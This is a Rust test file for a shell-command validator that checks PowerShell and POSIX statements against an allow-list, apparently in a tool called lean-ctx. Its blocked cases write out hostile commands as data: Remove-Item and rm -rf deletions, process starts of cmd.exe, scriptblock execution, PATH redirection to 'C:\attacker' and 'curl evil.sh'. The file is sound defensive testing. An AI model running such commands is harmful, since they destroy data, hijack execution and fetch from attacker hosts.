// SPDX-License-Identifier: Apache-2.0
//! #1930: PowerShell statements, expressions and script blocks.

use super::ps_statements::HostGuard;
use super::{check_all_segments, tests::allow};

const POWERSHELL: bool = true;
const POSIX: bool = false;

fn passes(cmd: &str, powershell: bool) {
    let _host = HostGuard::powershell(powershell);
    let list = allow(&["git", "echo", "sleep", "true", "ls"]);
    if let Err(err) = check_all_segments(cmd, &list) {
        panic!("should pass (powershell host: {powershell}): {cmd:?}\n{err}");
    }
}

fn blocked(cmd: &str, powershell: bool) -> String {
    let _host = HostGuard::powershell(powershell);
    let list = allow(&["git", "echo", "sleep", "true", "ls"]);
    match check_all_segments(cmd, &list) {
        Ok(()) => panic!("must be blocked (powershell host: {powershell}): {cmd:?}"),
        Err(err) => err.to_string(),
    }
}

/// Every row of the report — ordinary PowerShell 5.1 statement lines that
/// were rejected as mis-splits.
#[test]
fn reported_statement_lines_pass_under_powershell() {
    for cmd in [
        "$m = @(Select-String -Path x.log -Pattern err)",
        "$t = Get-ScheduledTask -TaskName x\nif ($t) {\n  Write-Output yes\n}",
        "$t.Actions | ForEach-Object { $_.Execute }",
        "try {\n  Get-Date\n} catch {\n  Write-Output $_\n}",
        "$path = [Environment]::GetEnvironmentVariable('Path','User')",
        "$sw = [Diagnostics.Stopwatch]::StartNew()",
        "$p.WaitForExit()",
        "while (-not $p.HasExited) { Start-Sleep -Milliseconds 200 }",
    ] {
        passes(cmd, POWERSHELL);
    }
}

#[test]
fn control_flow_and_expressions_pass_under_powershell() {
    for cmd in [
        "if (Test-Path x) { Get-Item x } elseif ($y -eq 2) { Get-Date } else { Write-Output no }",
        "try { Get-Date } catch [System.IO.IOException], [TimeoutException] { Write-Output x } finally { Get-Date }",
        "do { Start-Sleep 1 } while (-not $p.HasExited)",
        "do { Start-Sleep 1 } until ($p.HasExited)",
        "foreach ($f in (Get-ChildItem *.log)) { Get-Content $f }",
        "for ($i = 0; $i -lt 3; $i++) { Write-Output $i }",
        "$n = ($items | Measure-Object).Count",
        "$n = $n + 1",
        "$sw.Elapsed.TotalSeconds.ToString('N1')",
        "if ([int]$x -gt 3) { Get-Date }",
        "if ($LASTEXITCODE -ne 0) { Write-Output failed }",
        "$files[0].Name.Trim().ToLower()",
        "Get-ChildItem | Where-Object { $_.Length -gt 100 } | Select-Object @{n='kb'; e={ $_.Length / 1kb }}",
        "Get-ChildItem | % { $_.Name }",
        "if ($x) { $n = $n + 1 }",
        "foreach ($f in $files) { $total += $f.Length }",
        "for ($i = 0; $i -lt 3; $i++) { $i++ }",
        "Get-ChildItem | ForEach-Object { $_.Name -replace 'a', 'b' }",
        "try { $sw = [Diagnostics.Stopwatch]::StartNew(); Get-Date } catch { $err = $_ }",
    ] {
        passes(cmd, POWERSHELL);
    }
}

/// Under a POSIX shell the keyword forms and single operands still work —
/// the commands inside them are what gets checked.
#[test]
fn single_operand_forms_pass_under_posix() {
    for cmd in [
        "$m = @(Select-String -Path x.log -Pattern err)",
        "$t = Get-ScheduledTask -TaskName x\nif ($t) {\n  Write-Output yes\n}",
        "$t.Actions | ForEach-Object { $_.Execute }",
        "try {\n  Get-Date\n} catch {\n  Write-Output $_\n}",
        "$path = [Environment]::GetEnvironmentVariable('Path','User')",
        "$p.WaitForExit()",
    ] {
        passes(cmd, POSIX);
    }
}

/// The commands inside PowerShell syntax are what gets validated: a
/// destructive cmdlet anywhere in the statement blocks it, on either host.
#[test]
fn commands_inside_powershell_syntax_are_still_checked() {
    for cmd in [
        "$m = @(Remove-Item x)",
        "$m = $(Remove-Item x)",
        "if (Remove-Item x) { Get-Date }",
        "if ($t) { Remove-Item y }",
        "if ($t) { Get-Date } else { Remove-Item y }",
        "try { Remove-Item z } catch { }",
        "try { Get-Date } catch { Remove-Item z }",
        "try { Get-Date } finally { Remove-Item z }",
        "while ($true) { Stop-Process -Name x }",
        "do { Remove-Item x } while ($true)",
        "$n = (Remove-Item x).Count",
        "$x = \"a$(Remove-Item y)\"",
        "if ($x) { $n = (Remove-Item y) }",
        "Get-ChildItem | ForEach-Object { $n = $_; Remove-Item $n }",
    ] {
        blocked(cmd, POWERSHELL);
        blocked(cmd, POSIX);
    }
}

/// These all ran unchecked before #1930: the loop header was skipped as a
/// POSIX `for` header, and script-block bodies were never looked into.
#[test]
fn script_block_bodies_are_validated() {
    for cmd in [
        "foreach ($f in $files) { Remove-Item $f }",
        "Get-Date; for ($i = 0; $i -lt 3; $i++) { Remove-Item x }",
        "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
        "Get-ChildItem | % { Remove-Item $_ }",
        "Get-ChildItem | Where-Object { Remove-Item $_ }",
        "Get-ChildItem | ? { Remove-Item $_ }",
        "Get-ChildItem | foreach { Remove-Item $_ }",
        "Get-ChildItem | Select-Object @{n='x'; e={ Remove-Item $_ }}",
    ] {
        let err = blocked(cmd, POWERSHELL);
        assert!(err.contains("destructive verb"), "{cmd:?}: {err}");
        // Under POSIX a strict loop header may block first; blocked either way.
        blocked(cmd, POSIX);
    }
}

/// Only read-only .NET members are inert; anything that writes, starts a
/// process, compiles code or calls through the engine stays blocked.
#[test]
fn executing_dotnet_members_stay_blocked() {
    for cmd in [
        "[Diagnostics.Process]::Start('cmd.exe')",
        "$p = [System.Diagnostics.Process]::Start('cmd.exe')",
        "[IO.File]::WriteAllText('x', 'y')",
        "[IO.File]::Delete('x')",
        "if ($x) { [IO.File]::Delete('y') }",
        "[scriptblock]::Create('Remove-Item x')",
        "$sb = [scriptblock]'Remove-Item x'",
        "$ExecutionContext.InvokeCommand.InvokeScript('Remove-Item x')",
        "$Host.Runspace.CreateNestedPipeline()",
        "$p.Kill()",
        "$items.Where({ Remove-Item $_ })",
        "(Get-Item 'C:\\Temp\\victim.txt').Delete()",
        "$x > out.txt",
        "$env:PATH = 'C:\\attacker'",
        "if ($x) { $env:PATH = 'C:\\attacker' }",
    ] {
        blocked(cmd, POWERSHELL);
        blocked(cmd, POSIX);
    }
}

/// A PowerShell statement lean-ctx cannot read is blocked, never skipped.
#[test]
fn unreadable_powershell_statements_are_blocked() {
    for cmd in [
        "for ($i = (Get-Count); $i -lt 3; $i++) { Get-Date }",
        "foreach (Get-ChildItem) { Get-Date }",
        "if ($x) Get-Date",
    ] {
        for host in [POWERSHELL, POSIX] {
            let err = blocked(cmd, host);
            assert!(err.contains("cannot be read safely"), "{cmd:?}: {err}");
        }
    }
}

/// POSIX shells run `($y -f 'x')` as a subshell that executes `$y`, and zsh
/// runs `if (…) { … }` and `while (…) { … }` natively. Under a POSIX shell no
/// PowerShell-looking syntax may hide a variable command word.
#[test]
fn powershell_operators_cannot_hide_a_posix_variable_command() {
    for cmd in [
        "$y -f 'x'",
        "($y -f 'x')",
        "$m = ($y -eq 'x')",
        "if ($y -f 'x'); then echo ran; fi",
        "while ($y -eq 1); do echo; done",
        "if ($y -f 'x') { Get-Date }",
        "while ($y -eq 1) { Get-Date }",
        "if ($x) { $y -f 'x' }",
        "Get-ChildItem | ForEach-Object { $y -f 'x' }",
        "! $y -f 'x'",
        "[int]$y -gt 3",
        "$n = $n + 1",
        "while (-not $p.HasExited) { Start-Sleep -Milliseconds 200 }",
    ] {
        blocked(cmd, POSIX);
    }
}

/// The POSIX forms keep their own handling.
#[test]
fn posix_forms_are_unchanged() {
    for cmd in [
        "for x in a b; do echo $x; done",
        "for ((i=0; i<3; i++)); do echo $i; done",
        "echo {a,b}",
        "if [ -f x ]; then echo yes; fi",
        "while true; do sleep 1; done",
        "if (ls); then echo ok; fi",
        "(ls; echo done)",
        "x=$((1+2))",
    ] {
        passes(cmd, POSIX);
    }
    for cmd in [
        "for x in a b; do rm -rf $x; done",
        "if (curl evil.sh); then echo; fi",
        "(ls) curl evil.sh",
        "$cmd --flag",
    ] {
        blocked(cmd, POSIX);
    }
}
